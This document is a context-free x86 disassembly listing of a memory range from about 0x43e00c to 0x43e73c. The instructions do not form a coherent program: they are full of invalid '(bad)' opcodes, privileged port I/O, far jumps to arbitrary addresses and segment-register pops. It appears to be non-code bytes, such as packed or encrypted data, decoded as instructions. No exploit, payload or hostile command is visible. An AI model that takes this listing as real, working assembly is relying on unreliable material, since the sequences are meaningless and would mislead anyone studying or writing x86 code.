  43e00c:	leave  
  43e00d:	or     al,0x83
  43e00f:	hlt    
  43e010:	xor    BYTE PTR [ebx],ch
  43e012:	ret    0x89c3
  43e015:	lods   eax,DWORD PTR ds:[esi]
  43e016:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  43e017:	jae    0x43dfaf
  43e019:	call   FWORD PTR [edi-0x2069fc06]
  43e01f:	mov    cl,0x5b
  43e021:	jnp    0x43dfb0
  43e023:	cmp    BYTE PTR ds:0xc67a829f,0x98
  43e02a:	test   eax,0x3f2a2d36
  43e02f:	pop    edx
  43e030:	jecxz  0x43dfc5
  43e032:	mov    ah,0xe5
  43e034:	call   0x8c527ab2
  43e039:	and    BYTE PTR [edx],ch
  43e03b:	inc    ebx
  43e03c:	lahf   
  43e03d:	adc    cl,BYTE PTR [ebx-0x52]
  43e040:	jmp    0x43e001
  43e042:	sub    ebp,DWORD PTR [eax-0x6b]
  43e045:	test   al,0xd9
  43e047:	sbb    al,0xb4
  43e049:	cmp    eax,0x5fd90a7d
  43e04e:	pop    ss
  43e04f:	fnstsw WORD PTR es:[ecx-0x5b]
  43e053:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  43e054:	stos   DWORD PTR es:[edi],eax
  43e055:	inc    edx
  43e056:	pusha  
  43e057:	hlt    
  43e058:	mov    ch,0xec
  43e05a:	retf   0xa3cc
  43e05d:	out    dx,al
  43e05e:	xchg   BYTE PTR [ecx-0x53],bh
  43e061:	sti    
  43e062:	cmp    DWORD PTR [ecx],esi
  43e064:	repz not BYTE PTR [ecx-0x25d58577]
  43e06b:	xlat   BYTE PTR ds:[ebx]
  43e06c:	(bad)  
  43e06e:	sub    eax,esi
  43e070:	sbb    BYTE PTR [ecx+0x39],0x67
  43e074:	call   0x7039a651
  43e079:	sbb    ch,ah
  43e07b:	aad    0xea
  43e07d:	pop    ss
  43e07e:	push   ss
  43e07f:	fimul  WORD PTR [ebp+0x66]
  43e082:	test   edx,esp
  43e084:	sbb    BYTE PTR [esi],ch
  43e086:	pop    edi
  43e087:	mov    ds:0x27af1e91,eax
  43e08c:	inc    edi
  43e08d:	jns    0x43e0cb
  43e08f:	add    al,0xb5
  43e091:	pusha  
  43e092:	retf   
  43e093:	and    al,0xaa
  43e095:	stos   BYTE PTR es:[edi],al
  43e096:	jmp    0x43e0bb
  43e098:	cmp    ecx,ebp
  43e09a:	xor    DWORD PTR [ebx],esp
  43e09c:	push   esp
  43e09d:	xor    al,0x74
  43e09f:	mov    WORD PTR [esp+edi*2+0xf],gs
  43e0a3:	(bad)  
  43e0a4:	out    dx,eax
  43e0a5:	mov    WORD PTR [eax],fs
  43e0a7:	mul    BYTE PTR ds:0x5610feca
  43e0ad:	out    0xff,al
  43e0af:	test   DWORD PTR [esi+0x22],esp
  43e0b2:	dec    esp
  43e0b3:	push   edi
  43e0b4:	pavgw  mm7,QWORD PTR [eax]
  43e0b7:	in     eax,dx
  43e0b8:	mov    eax,DWORD PTR [esp+eax*8]
  43e0bb:	out    0xa3,eax
  43e0bd:	pop    ebx
  43e0be:	dec    esi
  43e0bf:	pop    ss
  43e0c0:	add    al,0xab
  43e0c2:	mov    esi,0xf2ed7698
  43e0c7:	loop   0x43e0e9
  43e0c9:	push   ecx
  43e0ca:	mov    ds:0xaf2a7280,al
  43e0cf:	jecxz  0x43e107
  43e0d1:	scas   eax,DWORD PTR es:[edi]
  43e0d2:	mov    ds:0x1a9a1b4a,eax
  43e0d7:	add    eax,0x701819bd
  43e0dc:	add    eax,0xb0d4bc4a
  43e0e1:	sub    ebp,esi
  43e0e3:	rcr    BYTE PTR [ecx],0x76
  43e0e6:	outs   dx,BYTE PTR ds:[esi]
  43e0e7:	addr16 jmp 0x43e108
  43e0ea:	mov    dh,0x3a
  43e0ec:	mov    ds:0xeb7cf7d3,eax
  43e0f1:	sbb    bh,BYTE PTR [eax-0x16]
  43e0f4:	jno    0x43e103
  43e0f6:	jno    0x43e13d
  43e0f8:	sub    eax,0x6f314679
  43e0fd:	aaa    
  43e0fe:	dec    esp
  43e0ff:	jnp    0x43e0e2
  43e101:	out    0x57,eax
  43e103:	test   DWORD PTR [eax-0x2eb36e93],edx
  43e109:	inc    ebx
  43e10a:	mov    ebp,0x4f76b951
  43e10f:	ds sub edx,ecx
  43e112:	push   ds
  43e113:	inc    esp
  43e114:	jecxz  0x43e0fa
  43e116:	loopne 0x43e116
  43e118:	retf   0x7795
  43e11b:	test   eax,0x19e77b05
  43e120:	(bad)  
  43e122:	sub    eax,0xbfc30533
  43e127:	jo     0x43e138
  43e129:	iret   
  43e12a:	sar    dh,0x7
  43e12d:	jmp    0x7cf245fe
  43e132:	aaa    
  43e133:	dec    ecx
  43e134:	loope  0x43e117
  43e136:	adc    al,0xd8
  43e138:	dec    ecx
  43e139:	jne    0x43e11e
  43e13b:	rol    DWORD PTR [edx+0x63],1
  43e13e:	stc    
  43e13f:	fs pop eax
  43e141:	lock ins DWORD PTR es:[edi],dx
  43e143:	sbb    ah,dl
  43e145:	sbb    al,0x49
  43e147:	arpl   WORD PTR [esi-0x2d],dx
  43e14a:	lods   eax,DWORD PTR ds:[esi]
  43e14b:	test   eax,0xa85914f4
  43e150:	push   ecx
  43e151:	and    BYTE PTR [ebx+0x5fa91f09],bl
  43e157:	fbstp  TBYTE PTR [esi+0x15]
  43e15a:	dec    edx
  43e15b:	jne    0x43e0f1
  43e15d:	aad    0x87
  43e15f:	inc    esi
  43e160:	inc    ecx
  43e161:	sub    BYTE PTR [ebp+0x23],dh
  43e164:	dec    ebx
  43e165:	adc    eax,DWORD PTR [eax-0x3]
  43e168:	inc    edx
  43e169:	mov    ch,0x87
  43e16b:	jmp    0x43e1db
  43e16d:	idiv   BYTE PTR [esi]
  43e16f:	jno    0x43e117
  43e171:	pop    edi
  43e172:	xchg   edx,eax
  43e173:	push   cs
  43e174:	or     ah,BYTE PTR [ebx+0x1a]
  43e177:	ror    DWORD PTR [eax-0x271ab9ff],cl
  43e17d:	pop    esp
  43e17e:	rcl    BYTE PTR [ebp+0x56],0x2c
  43e182:	test   BYTE PTR [edx-0x14],cl
  43e185:	jle    0x43e187
  43e187:	int3   
  43e188:	inc    esp
  43e189:	scas   al,BYTE PTR es:[edi]
  43e18a:	xchg   ebx,eax
  43e18b:	adc    ecx,0x498d83f2
  43e191:	adc    ecx,ecx
  43e193:	push   edx
  43e194:	inc    esp
  43e195:	es jnp 0x43e192
  43e198:	je     0x43e1e4
  43e19a:	pop    eax
  43e19b:	test   BYTE PTR [ebp+0x500f9ba3],ch
  43e1a1:	test   DWORD PTR [edi],eax
  43e1a3:	mov    bl,0xa
  43e1a5:	(bad)  [esi]
  43e1a7:	aas    
  43e1a8:	adc    DWORD PTR [esi+0x445d84fb],edi
  43e1ae:	push   0x1bc74ec7
  43e1b3:	mov    ah,0xbc
  43e1b5:	data16 fst QWORD PTR [esi+0x136e68cf]
  43e1bc:	lods   eax,DWORD PTR ds:[esi]
  43e1bd:	icebp  
  43e1be:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  43e1bf:	adc    ah,BYTE PTR [ebp+0x5]
  43e1c2:	pop    ds
  43e1c3:	es push eax
  43e1c5:	sbb    eax,DWORD PTR [edi+0x20ba98e3]
  43e1cb:	pop    edx
  43e1cc:	ins    DWORD PTR es:[edi],dx
  43e1cd:	scas   al,BYTE PTR es:[edi]
  43e1ce:	ds sti 
  43e1d0:	mov    BYTE PTR [esi+0x332675d1],0x21
  43e1d7:	adc    DWORD PTR [ebp-0x55],ebx
  43e1da:	out    dx,al
  43e1db:	jg     0x43e1f1
  43e1dd:	retf   
  43e1de:	enter  0x9464,0x9f
  43e1e2:	pop    eax
  43e1e3:	or     DWORD PTR [ebx],esp
  43e1e5:	dec    esp
  43e1e6:	push   es
  43e1e7:	mov    dh,0x61
  43e1e9:	xchg   DWORD PTR [ebx],eax
  43e1eb:	(bad)
  43e1ef:	(bad)  
  43e1f0:	pop    eax
  43e1f1:	ins    BYTE PTR es:[edi],dx
  43e1f2:	sub    al,0x69
  43e1f4:	xor    ah,BYTE PTR [esi]
  43e1f6:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  43e1f7:	sti    
  43e1f8:	(bad)  
  43e1fb:	fnclex 
  43e1fd:	xor    eax,0x47266de3
  43e202:	ret    
  43e203:	fcomp  DWORD PTR [edx+0x6ea4c7a8]
  43e209:	push   0x24
  43e20b:	pushf  
  43e20c:	push   ebx
  43e20d:	add    edx,eax
  43e20f:	movs   WORD PTR es:[edi],WORD PTR ds:[esi]
  43e211:	ret    0xd57d
  43e214:	mov    ds:0x36c868a0,al
  43e219:	add    ah,dl
  43e21b:	sub    al,0x93
  43e21d:	push   ds
  43e21e:	mov    eax,ds:0x32c73290
  43e223:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  43e224:	mov    ch,0xee
  43e226:	outs   dx,DWORD PTR ds:[esi]
  43e227:	bound  ebx,QWORD PTR [ebx-0x6aec17e7]
  43e22d:	inc    edi
  43e22e:	xor    edx,DWORD PTR [ecx]
  43e230:	js     0x43e269
  43e232:	dec    esp
  43e233:	push   ebp
  43e234:	pushf  
  43e235:	in     eax,0x43
  43e237:	das    
  43e238:	arpl   WORD PTR [esi+0x51887388],bp
  43e23e:	push   cs
  43e23f:	jbe    0x43e25a
  43e241:	je     0x43e24c
  43e243:	inc    ebp
  43e244:	mov    es,WORD PTR [eax-0x706c43a1]
  43e24a:	in     al,0x71
  43e24c:	je     0x43e206
  43e24e:	inc    esi
  43e24f:	sbb    esi,eax
  43e251:	xor    edx,ebp
  43e253:	or     ebp,esp
  43e255:	das    
  43e256:	push   es
  43e257:	jno    0x43e284
  43e259:	mov    ch,BYTE PTR [eax+ecx*2-0x3a]
  43e25d:	cmpxchg BYTE PTR [eax],ah
  43e260:	int3   
  43e261:	jg     0x43e252
  43e263:	inc    eax
  43e264:	clc    
  43e265:	pop    es
  43e266:	aad    0x78
  43e268:	test   eax,0x398df828
  43e26e:	sub    eax,0x687de63
  43e273:	js     0x43e20c
  43e275:	add    al,0x9c
  43e277:	retf   
  43e278:	cli    
  43e279:	dec    esp
  43e27a:	xchg   ebx,eax
  43e27b:	mov    al,ds:0xfca021d3
  43e280:	jg     0x43e280
  43e282:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  43e283:	mov    ch,BYTE PTR ds:0xb1f9d73
  43e289:	dec    esi
  43e28a:	sbb    DWORD PTR [ebx+ebp*2+0x4beae03b],ebx
  43e291:	sbb    edx,ebx
  43e293:	fmul   st(4),st
  43e295:	push   ebp
  43e296:	mov    esp,0xed7b913
  43e29b:	mov    al,ds:0xb07a1205
  43e2a0:	dec    ebx
  43e2a1:	jno    0x43e246
  43e2a3:	sub    bh,bl
  43e2a5:	jg     0x43e25a
  43e2a7:	jp     0x43e261
  43e2a9:	out    0xac,eax
  43e2ab:	inc    ecx
  43e2ac:	pushf  
  43e2ad:	lock push ecx
  43e2af:	popa   
  43e2b0:	aaa    
  43e2b1:	push   edx
  43e2b2:	pop    esp
  43e2b3:	arpl   si,sp
  43e2b5:	push   ss
  43e2b6:	or     eax,0x5e125240
  43e2bb:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  43e2bc:	xor    DWORD PTR [edi-0x5c485e20],0x82ed6b1c
  43e2c6:	sub    eax,0x389439e6
  43e2cb:	leave  
  43e2cc:	je     0x43e342
  43e2ce:	cmc    
  43e2cf:	(bad)  
  43e2d0:	cld    
  43e2d1:	pop    ebp
  43e2d2:	add    al,0x5
  43e2d4:	mov    DWORD PTR ds:0x5bf95149,eax
  43e2da:	arpl   WORD PTR [ebp-0x56],bx
  43e2dd:	out    0xc,eax
  43e2df:	push   edi
  43e2e0:	icebp  
  43e2e1:	and    al,0xcf
  43e2e3:	xchg   ebp,eax
  43e2e4:	pop    edi
  43e2e5:	les    ecx,FWORD PTR [eax]
  43e2e7:	imul   ecx,DWORD PTR [eax-0x1ba8ccda],0x571d8247
  43e2f1:	mov    WORD PTR [eax],gs
  43e2f3:	jmp    0x43e338
  43e2f5:	jbe    0x43e355
  43e2f7:	call   0x36c62b46
  43e2fc:	cmp    BYTE PTR [ecx-0x462d582c],dh
  43e302:	imul   eax,DWORD PTR [edx+0x27],0xe49d0fb1
  43e309:	js     0x43e2f9
  43e30b:	sbb    DWORD PTR [ebx],ebp
  43e30d:	jl     0x43e36b
  43e30f:	aas    
  43e310:	sti    
  43e311:	dec    ebp
  43e312:	push   edx
  43e313:	push   ss
  43e314:	aad    0x51
  43e316:	pop    ebx
  43e317:	adc    esi,DWORD PTR [ecx+0x15]
  43e31a:	int3   
  43e31b:	arpl   WORD PTR [ebx-0x6e],bp
  43e31e:	(bad)  
  43e31f:	pop    esp
  43e320:	leave  
  43e321:	mov    ds:0x7e44d996,eax
  43e326:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  43e327:	aam    0x98
  43e329:	fcmovu st,st(1)
  43e32b:	xchg   esp,eax
  43e32c:	sar    WORD PTR ss:[edi-0x4ff2f87d],0x88
  43e335:	jp     0x43e323
  43e337:	cmp    ch,BYTE PTR [edi]
  43e339:	imul   ebx,DWORD PTR [edx],0x19
  43e33c:	jnp    0x43e369
  43e33e:	sahf   
  43e33f:	clc    
  43e340:	and    BYTE PTR [eax+0x1e],bl
  43e343:	pop    esp
  43e344:	ins    DWORD PTR es:[edi],dx
  43e345:	out    0x3b,al
  43e347:	xchg   esp,eax
  43e348:	jl     0x43e3a9
  43e34a:	and    al,0x23
  43e34c:	jne    0x43e3c0
  43e34e:	dec    esi
  43e34f:	adc    DWORD PTR [ebp+ebx*1+0x34],esi
  43e353:	call   0xd575d4c8
  43e358:	xchg   ebx,eax
  43e359:	push   cs
  43e35a:	fwait
  43e35b:	pop    ss
  43e35c:	xor    BYTE PTR [ecx+0x303589e9],bl
  43e362:	or     DWORD PTR [ebx],ebx
  43e364:	push   eax
  43e365:	mov    ds:0x6988bf26,eax
  43e36a:	paddw  mm3,mm7
  43e36d:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  43e36e:	popa   
  43e36f:	and    dl,BYTE PTR [edx-0x67266061]
  43e375:	fcom   DWORD PTR [ebp+ecx*8-0x23a88b67]
  43e37c:	in     al,dx
  43e37d:	scas   al,BYTE PTR es:[edi]
  43e37e:	xor    eax,0xc9f88677
  43e383:	(bad)  
  43e384:	mov    ebp,0xe252368f
  43e389:	push   ebx
  43e38a:	aad    0xc6
  43e38c:	enter  0x2e2f,0x8a
  43e390:	daa    
  43e391:	sahf   
  43e392:	jmp    0xfd4d:0x1a5b3b1
  43e399:	sbb    al,0xe0
  43e39b:	ins    DWORD PTR es:[edi],dx
  43e39c:	and    BYTE PTR [ecx],bl
  43e39e:	mov    bl,BYTE PTR [eax-0x724272d8]
  43e3a4:	enter  0xd6cd,0x77
  43e3a8:	mov    WORD PTR [eax],?
  43e3aa:	push   0x49
  43e3ac:	cmp    ebp,DWORD PTR [ebp+0x20]
  43e3af:	push   ecx
  43e3b0:	(bad)  
  43e3b1:	out    dx,al
  43e3b2:	xchg   esp,eax
  43e3b3:	sbb    BYTE PTR [ebx-0x49640d83],ch
  43e3b9:	imul   ecx,DWORD PTR [ecx+0x5e20d05c],0x7c
  43e3c0:	jns    0x43e3e6
  43e3c2:	pop    ecx
  43e3c3:	cmp    al,BYTE PTR [edi+0x4c]
  43e3c6:	pop    edi
  43e3c7:	mov    DWORD PTR [edx],ebp
  43e3c9:	fimul  DWORD PTR [ebx-0x1322b26b]
  43e3cf:	ins    DWORD PTR es:[edi],dx
  43e3d0:	fs xchg ebx,eax
  43e3d2:	sub    edi,DWORD PTR [esi]
  43e3d4:	imul   edi,DWORD PTR [ebx-0x13],0x63f30c54
  43e3db:	mov    dl,0x4e
  43e3dd:	jne    0x43e392
  43e3df:	adc    eax,0x40c509ba
  43e3e4:	pusha  
  43e3e5:	adc    al,0x88
  43e3e7:	add    esp,0x69
  43e3ea:	adc    eax,DWORD PTR [ecx-0x59700ad8]
  43e3f0:	(bad)  
  43e3f1:	inc    esp
  43e3f2:	pop    edi
  43e3f3:	in     al,dx
  43e3f4:	out    0x5f,eax
  43e3f6:	mov    BYTE PTR [ecx],ch
  43e3f8:	mov    edi,0x8bdb8b9f
  43e3fd:	mov    dh,0x9d
  43e3ff:	and    bl,BYTE PTR [ebx+0x551220a5]
  43e405:	call   0x9cd410e1
  43e40a:	aam    0x81
  43e40c:	rep stos DWORD PTR es:[edi],eax
  43e40e:	jmp    0x30c0d0fe
  43e413:	and    al,0x3c
  43e415:	push   eax
  43e416:	scas   al,BYTE PTR es:[edi]
  43e417:	xchg   ebx,eax
  43e418:	and    al,0x50
  43e41a:	and    BYTE PTR [ebx+0x6268de11],al
  43e420:	mov    esi,0x91f52634
  43e425:	jg     0x43e3ff
  43e427:	inc    esp
  43e428:	jg     0x43e498
  43e42a:	xchg   DWORD PTR [edi+0x1eb3d533],eax
  43e430:	and    DWORD PTR [ebp+0x18d2dabd],edi
  43e436:	mov    ds:0x8ac57eb8,al
  43e43b:	fwait
  43e43c:	mov    dh,0xeb
  43e43e:	sahf   
  43e43f:	xor    DWORD PTR [edi],ebx
  43e441:	adc    al,0x7c
  43e443:	sub    edx,ecx
  43e445:	inc    esi
  43e446:	cmp    DWORD PTR [eax-0x44d015eb],0x942dd81f
  43e450:	arpl   WORD PTR [edx+0x15],di
  43e453:	jle    0x43e4aa
  43e455:	xchg   esp,eax
  43e456:	pop    DWORD PTR [ebx]
  43e458:	mov    ah,0x85
  43e45a:	int    0x1c
  43e45c:	call   0x6589:0x51ad6e40
  43e463:	jae    0x43e4c5
  43e465:	aam    0x6
  43e467:	ins    BYTE PTR es:[edi],dx
  43e468:	int3   
  43e469:	xlat   BYTE PTR ds:[ebx]
  43e46a:	rol    esi,1
  43e46c:	or     BYTE PTR [edi],bl
  43e46e:	das    
  43e46f:	mov    dl,0x2c
  43e471:	pop    edi
  43e472:	cmp    ecx,ebp
  43e474:	pop    ss
  43e475:	xchg   esi,eax
  43e476:	cwde   
  43e477:	outs   dx,BYTE PTR ds:[esi]
  43e478:	jo     0x43e436
  43e47a:	pop    edi
  43e47b:	je     0x43e4e4
  43e47d:	inc    ebp
  43e47e:	ror    BYTE PTR [esi+0x3846077],0x88
  43e485:	lea    esi,[ecx]
  43e487:	shl    BYTE PTR [edi+ebp*2],0x14
  43e48b:	int3   
  43e48c:	retf   
  43e48d:	jmp    0x43e481
  43e48f:	jae    0x43e422
  43e491:	jecxz  0x43e4b5
  43e493:	dec    esi
  43e494:	lods   eax,DWORD PTR ds:[esi]
  43e495:	jecxz  0x43e50e
  43e497:	cwde   
  43e498:	aas    
  43e499:	or     BYTE PTR [ebx-0x12f06840],dl
  43e49f:	stos   BYTE PTR es:[edi],al
  43e4a0:	imul   esi,esp,0xa4151962
  43e4a6:	sub    eax,0xc0a7d490
  43e4ab:	xor    bl,BYTE PTR ds:0x20b9ad1d
  43e4b1:	arpl   WORD PTR [ebx+0x4c32663d],di
  43e4b7:	jo     0x43e463
  43e4b9:	(bad)  
  43e4ba:	jns    0x43e471
  43e4bc:	mov    dh,0x1c
  43e4be:	cld    
  43e4bf:	shl    BYTE PTR [eax+0x73],0x8c
  43e4c3:	rcl    dh,cl
  43e4c5:	adc    BYTE PTR [ecx+eiz*4+0x1668af9d],ch
  43e4cc:	enter  0xfa24,0xb3
  43e4d0:	push   eax
  43e4d1:	fisttp QWORD PTR [edx+0x41a2426c]
  43e4d7:	add    al,0xab
  43e4d9:	push   ecx
  43e4da:	cmp    ebx,edi
  43e4dc:	(bad)  
  43e4dd:	fwait
  43e4de:	sbb    DWORD PTR [ebp+edx*4+0x2f],edi
  43e4e2:	fs xchg esi,eax
  43e4e4:	std    
  43e4e5:	push   0xecce0d4
  43e4ea:	jbe    0x43e503
  43e4ec:	xchg   edx,eax
  43e4ed:	int3   
  43e4ee:	in     al,0x3e
  43e4f0:	loopne 0x43e54e
  43e4f2:	(bad)  
  43e4f3:	retf   0xb848
  43e4f6:	sub    ecx,DWORD PTR [ebx-0x4f]
  43e4f9:	push   edi
  43e4fa:	xor    al,0x90
  43e4fc:	pop    eax
  43e4fd:	cld    
  43e4fe:	or     dh,BYTE PTR [ecx-0xb]
  43e501:	js     0x43e488
  43e503:	leave  
  43e504:	pop    esp
  43e505:	adc    ch,BYTE PTR [ecx+0x17de6da1]
  43e50b:	leave  
  43e50c:	iret   
  43e50d:	cli    
  43e50e:	lea    ebx,[edi]
  43e510:	mov    ds:0x1a0c77fc,eax
  43e515:	push   edx
  43e516:	push   ecx
  43e517:	in     al,0x80
  43e519:	dec    ecx
  43e51a:	jbe    0x43e4b7
  43e51c:	adc    ebp,edx
  43e51e:	aam    0x7b
  43e520:	int    0x45
  43e522:	or     DWORD PTR ds:0x8b5d369c,edi
  43e528:	mov    al,ds:0xdc7f5cc6
  43e52d:	xchg   BYTE PTR [edx],dh
  43e52f:	scas   al,BYTE PTR es:[edi]
  43e530:	cld    
  43e531:	imul   esp,DWORD PTR [ebx+0x52e2d49],0xffffff83
  43e538:	adc    esi,esp
  43e53a:	out    dx,al
  43e53b:	sbb    BYTE PTR [ecx+ecx*1],0xde
  43e53f:	out    dx,eax
  43e540:	inc    ecx
  43e541:	shl    BYTE PTR [esi-0x22],cl
  43e544:	je     0x43e4d1
  43e546:	int3   
  43e547:	mov    ebx,0x165e6614
  43e54c:	loop   0x43e599
  43e54e:	adc    dl,BYTE PTR [ecx-0x720a5065]
  43e554:	jp     0x43e4f6
  43e556:	inc    eax
  43e557:	daa    
  43e558:	and    BYTE PTR [esi+edx*2-0x2f],0x85
  43e55d:	mov    DWORD PTR [edx],edx
  43e55f:	(bad)  [eax+0xcc7b707]
  43e565:	xchg   ebp,eax
  43e566:	push   es
  43e567:	cli    
  43e568:	out    dx,eax
  43e569:	jecxz  0x43e596
  43e56b:	mov    edi,eax
  43e56d:	aam    0x83
  43e56f:	xchg   ebp,eax
  43e570:	xchg   ebp,eax
  43e571:	test   ebp,0x28d08c70
  43e577:	mov    eax,ds:0x5a7be800
  43e57c:	cmp    edx,DWORD PTR [edx+0x43102d6b]
  43e582:	cwde   
  43e583:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  43e584:	jb     0x43e5c2
  43e586:	jle    0x43e55d
  43e588:	adc    BYTE PTR [eax],0xaf
  43e58b:	mov    cl,0x9d
  43e58d:	int    0xc7
  43e58f:	(bad)  
  43e590:	add    edx,DWORD PTR [edi]
  43e592:	stos   BYTE PTR es:[edi],al
  43e593:	or     dl,BYTE PTR [ecx+0x7edf65a]
  43e599:	mov    esi,0xe6ef32f0
  43e59e:	iret   
  43e59f:	add    dl,BYTE PTR [eax+0x14440088]
  43e5a5:	jo     0x43e588
  43e5a7:	jnp    0x43e5c2
  43e5a9:	xchg   ebx,eax
  43e5aa:	jmp    0x43e57c
  43e5ac:	push   esp
  43e5ad:	das    
  43e5ae:	mov    esi,0x62edb0f2
  43e5b3:	adc    ch,BYTE PTR [esi-0x3a35a04]
  43e5b9:	ja     0x43e53f
  43e5bb:	pop    ss
  43e5bc:	lods   al,BYTE PTR ds:[esi]
  43e5bd:	push   es
  43e5be:	adc    al,dh
  43e5c0:	cmp    DWORD PTR [edi+0x46],esi
  43e5c3:	mov    ch,0x2c
  43e5c5:	jecxz  0x43e54c
  43e5c7:	pop    esi
  43e5c8:	adc    DWORD PTR [ebp+0x1bdb65e2],ebp
  43e5ce:	rcl    bl,cl
  43e5d0:	ror    BYTE PTR [ebx+0x62032a1f],0x32
  43e5d7:	jae    0x43e5ea
  43e5d9:	test   BYTE PTR [ecx-0x58],bh
  43e5dc:	leave  
  43e5dd:	mov    es,WORD PTR [eax-0x5d912711]
  43e5e3:	je     0x43e65e
  43e5e5:	inc    esi
  43e5e6:	bound  esi,QWORD PTR [ebp-0x22]
  43e5e9:	fwait
  43e5ea:	into   
  43e5eb:	loopne 0x43e631
  43e5ed:	adc    eax,DWORD PTR [ebx]
  43e5ef:	lods   eax,DWORD PTR ds:[esi]
  43e5f0:	scas   eax,DWORD PTR es:[edi]
  43e5f1:	lods   eax,DWORD PTR ds:[esi]
  43e5f2:	mov    esp,ebx
  43e5f4:	jb     0x43e5cd
  43e5f6:	call   0xd5be8c77
  43e5fb:	or     cl,bh
  43e5fd:	push   ds
  43e5fe:	dec    ecx
  43e5ff:	sbb    al,0xf3
  43e601:	or     esi,DWORD PTR [edi]
  43e603:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  43e604:	and    bh,al
  43e606:	lods   al,BYTE PTR ds:[esi]
  43e607:	in     eax,dx
  43e608:	xchg   ebp,eax
  43e609:	adc    BYTE PTR [edx+esi*2+0x4d433aa9],0xf2
  43e611:	popf   
  43e612:	dec    ecx
  43e613:	or     bl,bh
  43e615:	fcomp  QWORD PTR [edx-0x12]
  43e618:	sbb    bh,ch
  43e61a:	ins    BYTE PTR es:[edi],dx
  43e61b:	jbe    0x43e5a9
  43e61d:	mov    dh,0x13
  43e61f:	xor    bh,BYTE PTR [eax-0x3489bf04]
  43e625:	cmp    al,0xf6
  43e627:	sbb    al,0x1a
  43e629:	(bad)  
  43e62a:	fiadd  DWORD PTR [ecx+0x35d9e687]
  43e630:	pop    ebx
  43e631:	jb     0x43e664
  43e633:	repz pop ds
  43e635:	(bad)  
  43e636:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  43e637:	xchg   edx,eax
  43e638:	adc    eax,0xe77527c8
  43e63d:	dec    esi
  43e63e:	dec    edi
  43e63f:	mov    DWORD PTR [edi+0x16],ecx
  43e642:	sbb    al,0x5f
  43e644:	pop    ecx
  43e645:	lea    ebp,[eax+0x51f9f672]
  43e64b:	fcomp  DWORD PTR [ebx-0x5f47e110]
  43e651:	cmp    ebx,DWORD PTR [eax-0x46]
  43e654:	xchg   edx,eax
  43e655:	add    eax,DWORD PTR [ebp+0x46c0df91]
  43e65b:	cmp    DWORD PTR [ebp+0x36a95daf],edx
  43e661:	out    0x2,eax
  43e663:	into   
  43e664:	cmp    ch,BYTE PTR [esi-0x7d21daf]
  43e66a:	test   al,0x5b
  43e66c:	scas   al,BYTE PTR es:[edi]
  43e66d:	jo     0x43e6bd
  43e66f:	fucom  st(3)
  43e671:	aam    0x4e
  43e673:	rcr    edx,1
  43e675:	call   0xee80:0x47db8edc
  43e67c:	xor    esp,DWORD PTR [esi+0x7821595f]
  43e682:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  43e683:	lock xor bh,BYTE PTR [edx+0x24]
  43e687:	das    
  43e688:	jb     0x43e701
  43e68a:	fs xchg edx,eax
  43e68c:	dec    edi
  43e68d:	sahf   
  43e68e:	jae    0x43e659
  43e690:	jl     0x43e68f
  43e692:	fst    DWORD PTR [edx+0x41628667]
  43e698:	jecxz  0x43e61d
  43e69a:	fnsave [edi]
  43e69c:	aad    0x4e
  43e69e:	repz std 
  43e6a0:	cld    
  43e6a1:	test   esi,esi
  43e6a3:	mov    al,ds:0xbba50689
  43e6a8:	xchg   esi,eax
  43e6a9:	bound  eax,QWORD PTR [ebp+0x3b]
  43e6ac:	rol    DWORD PTR [edi+0x2e3eb4c0],1
  43e6b2:	and    bl,dl
  43e6b4:	cli    
  43e6b5:	ficom  DWORD PTR [edx]
  43e6b8:	xchg   esp,eax
  43e6b9:	popf   
  43e6ba:	int3   
  43e6bb:	xrelease mov BYTE PTR [eax],ch
  43e6be:	clc    
  43e6bf:	in     al,dx
  43e6c0:	repz imul ebp,DWORD PTR [edx+0x4b284a3a],0x8ac6de08
  43e6cb:	push   cs
  43e6cc:	inc    ebx
  43e6cd:	js     0x43e689
  43e6cf:	scas   eax,DWORD PTR es:[edi]
  43e6d0:	and    cl,BYTE PTR [ecx-0x35c930ef]
  43e6d6:	inc    esi
  43e6d7:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  43e6d8:	neg    DWORD PTR [ebx+0x14]
  43e6db:	nop
  43e6dc:	std    
  43e6dd:	repnz mov WORD PTR [eax+edi*1-0x73ee6b7f],ds
  43e6e5:	loopne 0x43e711
  43e6e7:	jge    0x43e6d8
  43e6e9:	pushf  
  43e6ea:	ins    BYTE PTR es:[edi],dx
  43e6eb:	cld    
  43e6ec:	inc    esp
  43e6ed:	fld    TBYTE PTR [ebx+eiz*2+0x5]
  43e6f1:	ss sbb al,0xc7
  43e6f4:	stos   BYTE PTR es:[edi],al
  43e6f5:	int3   
  43e6f6:	xchg   esp,eax
  43e6f7:	and    edx,DWORD PTR [edi]
  43e6f9:	add    cl,BYTE PTR cs:0x7c6f
  43e6ff:	mov    bl,0xeb
  43e701:	and    eax,0x5420e8c7
  43e706:	stos   BYTE PTR es:[edi],al
  43e707:	push   es
  43e708:	aam    0x72
  43e70a:	stos   DWORD PTR es:[edi],eax
  43e70b:	(bad)  
  43e70c:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  43e70d:	ins    BYTE PTR es:[edi],dx
  43e70e:	aam    0xc
  43e710:	cld    
  43e711:	lea    ecx,ss:[eax]
  43e714:	inc    edi
  43e715:	in     eax,dx
  43e716:	mov    edx,0xbe42d55e
  43e71b:	lods   al,BYTE PTR ds:[esi]
  43e71c:	aam    0xa5
  43e71e:	call   DWORD PTR [esp+ebp*4]
  43e721:	or     bl,ah
  43e723:	rcl    DWORD PTR [ebx],cl
  43e725:	adc    eax,0x6e0f2517
  43e72a:	push   edx
  43e72b:	les    esp,FWORD PTR [ecx+edx*2+0x10128cef]
  43e732:	loopne 0x43e6e2
  43e734:	cdq    
  43e735:	sar    DWORD PTR [edi+0x52c8e718],0xf7
  43e73c:	out    dx,al
